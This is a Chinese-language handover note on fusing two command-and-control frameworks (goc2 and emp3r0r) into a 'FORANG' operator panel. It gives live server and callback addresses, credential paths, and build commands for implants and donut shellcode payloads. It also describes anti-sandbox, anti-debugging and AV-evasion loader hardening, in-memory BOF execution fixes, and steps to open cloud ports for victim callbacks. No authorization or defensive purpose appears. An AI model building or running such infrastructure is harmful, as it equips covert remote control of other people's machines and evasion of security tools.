# 交接：FORANG 双 C2 融合（goc2 + emp3r0r）——遗留 1-3 全部完成，验收通过（2026-11-18 03:45）

> 接 2026-11-17 21:00 版本。本版更新：**遗留 1-3 全部完成，第五节四条验收标准全部
> 通过**。本文件其余部分保留原背景，末尾"2026-11-18 收尾记录"为接手方必读增量。

## 一、部署现状（DSH 158.180.91.185，本机即部署机）

| 组件 | 位置/端口 | 状态 |
|---|---|---|
| goc2 v0.3.0 容器 | `/root/forang-deploy/`，127.0.0.1:18400 | ✅ 验收通过（agent/PTY/generate） |
| FORANG 面板容器 | 127.0.0.1:8787，nginx forang.allclb.com:443 | ✅ 验收通过（融合版二进制 2026-11-18） |
| 生产 beacon agent | systemd `goc2-agent.service`，连 18400 | ✅ 在线（sess_1_478aa5b4） |
| goc2 回连域名 | https://goc2.allclb.com（LE 证书，nginx 白名单） | ✅ 目标机视角实测 |
| FORANG MCP | `/usr/local/bin/forang-mcp`（stdio，13 工具） | ✅ 实测（OPSEC 闸+审计） |
| emp3r0r server | `/usr/local/bin/emp3r0r`，C2 HTTP 13456 + WG 面 13377/13378 | ✅ **systemd 化（emp3r0r-server.service，enabled）** |
| emp3r0r-bridge | `/usr/local/bin/emp3r0r-bridge`，systemd，172.17.0.1:18660 | ✅ 运行中（mcp_alive=true，自愈已验证） |
| emp3r0r agent | systemd `emp3r0r-agent.service`，tag 800bc02b，连 127.0.0.1:13456 | ✅ **在线，BOF exec 全链路通** |

关键凭据/配置：
- bridge token：`/root/forang-deploy/emp3r0r-bridge.env` 与 `.env` 的 `EMP3R0R_BRIDGE_TOKEN`（同值）
- WG operator 凭据：`/root/.emp3r0r/wg_config.json`（bridge 自动读取构造 mcp 参数）
- FORANG JWT：容器内 `/app/jwt.key`（容器重建会变，用 docker cp 取；2026-11-18 已重签，/tmp/forang.token）
- FORANG MCP 审计：`~/.forang-mcp/audit.jsonl`
- **MagicString（server 实际内嵌）**：`64781530-1475-4cf8-950c-dcdf4c619dbc`（def 包默认值，`strings /usr/local/bin/emp3r0r` 可证）——`~/.emp3r0r/magic_string` 里的 `bd1d...` 是 build.py 自行持久化的，与 server **不匹配**，不要用
- Go 工具链：`/usr/local/go` = go1.27.4（garble v0.18 要求 ≥1.27；emp3r0r go.mod 要 ≥1.26.11，用 1.27.4 编译兼容）

## 二、三大块工作（背景，未变）

### 1. goc2 真实 agent + /generate（v0.3.1，提交 3f340c7）
- `internal/beacon`：零依赖 agent 核心（checkin/poll/exec/download/upload/sleep/
  sysinfo/PTY 管道模式/未知类型 failed/404 自愈重连/GOC2_CFG_JSON env 配置通道）
- 内嵌配置块 288B（magic GOC2CFG\x01 + server 184B + key 64B + listener 32B），
  /generate 字节 patch，单测在 config_test.go
- /generate：10 format 预编译模板（scripts/build-payloads.sh，含 donut shellcode），
  shellcode=donut x64 PIC（t1_classic 免杀加载器的输入，配置经 env 通道）
- FORANG 融合缝隙修复：Task JSON 双形状（taskId/result + id/output/error/createdAt）
- 拓扑：nginx goc2.allclb.com 白名单（仅回连三端点）+ certbot 已签
- 已知限制：garble 不支持 go1.26（_g=去符号降级）；SOCKS 数据面未定义

### 2. FORANG 深读 + 免杀强化（FORANG 提交 2e84488）
- 深读结论见 git log 与此前会话总结；四个模块：C2 AI 编排/webshell 矩阵/
  免杀三模板/carriers（资产分析）
- t3 死代码接回：五重沙箱检测（路径/进程黑名单/硬件/交互空闲/时间加速）+
  反调试双通道 + 行为延迟 + 内存清洗；标签修正为真实能力
- t1 VEH 内存保护接线：密文写入 + PAGE_NOACCESS + 首次执行解密放行
- **遗留建议**：shellcode format 的 t1 配 Go beacon 存在 donut 加载 Go PE 不可靠
  风险（FORANG 作者实测结论），t1 真实稳定用法需 C/Rust shellcode

### 3. 面板融合 emp3r0r（FORANG 提交 b4297c8 + 8682276）
- 架构：FORANG 容器不持 WG 凭据；宿主机 `emp3r0r-bridge`（持凭据 + spawn
  `emp3r0r mcp`）暴露 token 保护的 localhost REST；FORANG `server/emp3r0r.go`
  适配层经 bridge 操作；会话 id `emp3r0r:` 前缀命名空间，c2_api.go 按前缀路由
- FORANG 侧已验证：/status 融合字段 `emp3r0r:{reachable,mcp_alive}` 生效
- 8682276 修复（2026-11-18，详见该提交）：bridge /job 参数形状、/exec 走 callTool
  自愈、/clients 解析 `{"agents":[...]}` 包裹、exec 任务轮询 /job 回填命令回显

## 三、遗留状态（2026-11-18 收尾记录——接手方必读）

原遗留 1-3 全部完成；过程中挖出并修复的根因链如下。

**遗留 1（bridge 自愈）✅**：kill mcp 子进程 → 下一次 /agents 触发
`write |1: broken pipe` → 日志 `重建 client 重试` → `mcp client rebuilt` → 0.07s
成功返回。另发现并修复：**handleExec 的 run_module 原来绕过 callTool 没有自愈**
（8682276 修复）。注意一个运维事实：server 重启后，bridge 的旧 mcp 在**下次工具
调用前**不会自愈（mcp 进程活着、list_agents 秒回空列表）——`systemctl restart
emp3r0r-bridge` 即可重建 operator tunnel。

**遗留 2（agent 上线）✅**，根因链（每条都实测）：
1. **MagicString**：server 二进制内嵌 def 默认值 `64781530-...`，不是
   `~/.emp3r0r/magic_string` 里的 `bd1d...`。generate（MCP 工具）用
   `--payload-magic-string` 或显式 `cc` 参数时必须传 server 的值。
2. **build.py 三连坑**：a) `shutil.which("go")` 找不到 go 直接退出（PATH 加
   `/usr/local/go/bin`）；b) 407 行硬编码 `GOTOOLCHAIN=local` 且 go.mod 要
   ≥1.26.11（/usr/local/go 需是真实 toolchain，已放 go1.27.4）；c) cgo 构建硬编码
   musl `-static-pie`（zig musl target 无动态模式）。
3. **真正可用的上线流程**（比 build.py 更简单）：
   - stub：`build.py --build-payload --payload-kind cgo ... --payload-output
     /root/.emp3r0r/stub-arm64 --payload-magic-string 64781530-...` 出的 stub 是
     static-pie；**BOF 需要动态链接**，用手工命令（本机原生 gcc）：
     `CGO_ENABLED=1 CC=gcc go build -buildmode=pie -tags 'netgo release agent
     <tags>' -ldflags "MagicString/QUICKey/Version 注入 + -linkmode external"`，
     产物 NEEDED libc.so.6（/proc/self/maps 出现 libc.so.6 即过
     memmod.LinuxLibcMapped 检查）。
   - patch：把 stub 放 `/root/.emp3r0r/stub-arm64`，走 **MCP `generate` 工具**
     （`tools/call generate {type: linux_executable, arch: arm64, cc: "127.0.0.1"}`），
     它做 config 加密（含 CA 签名 UUID）+ 字节 patch 0xff 占位。cc 传 127.0.0.1
     或公网 IP；**operator 默认 cc 是 127.0.0.1**。
   - 公网回连注意：158.180.91.185 是 Oracle Cloud NAT 前端，**13456/27286 未在
     云安全组放行**（hairpin 也不通），本机验收用 127.0.0.1；真实目标机部署前
     先放行安全组。
4. **BOF 链 arm64 三连修**（emp3r0r 本地提交 90ba0d9，upstream 是 jm33-m0 仓库
   无推送权限，仅本地）：loader_linux.c 的 e_machine 硬编码 EM_X86_64 → 按编译
   目标架构判定；补 arm64 五种重定位 + trampoline（**LDR literal imm19 单位是
   4 字节，`[pc,#8]` = 0x58000051，写成 0x58000211 会偏移 64 字节**——这是
   "guest execution fault" 的直接原因）；**arm64 必须刷 icache**（x86 自同步），
   mprotect 后加 `__builtin___clear_cache`。
5. **Go agent 的 exec BOF 缺 host 桥**（90ba0d9 bof_host_linux.go 新增）：只有
   C agent 注册 SetHostBridge，Go agent 的 host_exec 是 NULL → "ExecCmd
   unavailable"。新增 cgo 桥：ProcAddressByName("SetHostBridge") + 指针调用
   （memmod.CallExportWithArgs 限 5 参数）+ //export bofGoHostExec 回调（语义
   对齐 C agent bof_exec_impl）。
6. **部署节奏坑**：server 侧 coffloader_linux.so 换版后首次 exec 可能因
   `register_www_download` 超时失败一次（operator API 偶发慢），重试即成；换
   loader 后必须 `MCP reload_modules` 让 server 重读模块。

**遗留 3（systemd 化）✅**：两个 unit 已写并 enabled：
- `emp3r0r-server.service`：`Environment=HOME=/root`（emp3r0r 依赖 $HOME 找
  ~/.emp3r0r），ExecStart 不带 `--operators`（wg_config.json 已持久化 operator，
  带了会拒绝启动），日志 append 到 /tmp/emp3r0r-server.log
- `emp3r0r-agent.service`：验收用 agent（tag 800bc02b 动态链接版），exec 方式
  与 goc2-agent 一致

## 四、验收结果（第五节四条，2026-11-18 实测）

- FORANG /clients 同屏：`sess_1_478aa5b4`（goc2）+ `emp3r0r:800bc02b`（emp3r0r）✅
- FORANG /exec 对 emp3r0r 目标：run_module exec 经 coffloader 内存加载，任务视图
  直接输出命令回显（`uid=0(root) ... aarch64`；`root + date` 实测）✅
- bridge 自愈：kill mcp → broken pipe → rebuild → 工具调用成功（journalctl 有
  记录）✅
- /status 双后端 reachable=true 稳定（goc2 beacons=1、emp3r0r reachable+mcp_alive
  且 active_target 正确）✅

## 五、命令速查（增量）

```bash
# FORANG 状态（含 emp3r0r 后端健康）
curl -s http://127.0.0.1:8787/api/tools/c2/status -H "Authorization: Bearer $(cat /tmp/forang.token)"
# FORANG JWT 重签（容器重建后）
docker cp forang-deploy-artex-1:/app/jwt.key /tmp/jwt.key   # 然后 HS256 sub=FORANG 签 7d
# FORANG MCP（stdio 挂载示例）
FORANG_JWT_KEY=$(docker exec forang-deploy-artex-1 cat /app/jwt.key) /usr/local/bin/forang-mcp
# bridge
systemctl status emp3r0r-bridge; journalctl -u emp3r0r-bridge -n 20 --no-pager
T=$(grep EMP3R0R_BRIDGE_TOKEN /root/forang-deploy/emp3r0r-bridge.env | cut -d= -f2)
curl -s http://172.17.0.1:18660/status -H "X-Bridge-Token: $T"
curl -s http://172.17.0.1:18660/agents -H "X-Bridge-Token: $T"
# emp3r0r server / agent（都已 systemd）
systemctl status emp3r0r-server emp3r0r-agent
tail -5 /tmp/emp3r0r-server.log
# goc2 agent
systemctl status goc2-agent; curl -s http://127.0.0.1:18400/healthz
# 仓库
git -C /root/goc2-teamserver log --oneline -3   # v0.3.1=3f340c7（已推送）
git -C /root/forang-src log --oneline -3        # 8682276（已推送）
git -C /root/emp3r0r log --oneline -2           # 90ba0d9 本地 fork（upstream 无权限，勿推）
# MCP 直调脚本（generate/reload_modules 用，spawn 独立 mcp 进程）
python3 /tmp/mcp_generate.py   # 生成 arm64 agent（cc=127.0.0.1）
python3 /tmp/mcp_reload.py     # server 重读模块
```

**FORANG 二进制重建流程**（源码改动后）：
`PATH=/usr/local/go/bin:$PATH CGO_ENABLED=0 GOARCH=arm64 go build -tags embedui
-trimpath -ldflags "-s -w -buildid=" -o /root/forang-deploy/dist/arm64/artex
./cmd/artex`，然后 `cd /root/forang-deploy && docker compose up -d --build artex`，
容器重建后**必须重签 JWT**（jwt.key 随机）。

## 六、已知限制（新增/沿用）

- emp3r0r exec BOF 链当前只在 arm64（本机）打通；x86_64 目标的 loader 需按
  Makefile 的 zig target 重编（`ZIG_TARGET=x86_64-linux-gnu.2.17 make`），
  源码改动对两架构通用
- agent 的 read/write/upload/sha256/relay host 回调未实现（NULL），需要这些
  原语的 BOF 会报显式错误——后续按需在 bof_host_linux.go 补
- 云安全组未放行 13456/27286：目标机回连前必须放行，或走 nginx 反代+域名
- FORANG tasks API 不带 task_id 时只查 goc2 分支（emp3r0r 任务需带 task_id
  轮询；前端默认行为如此，不阻塞）
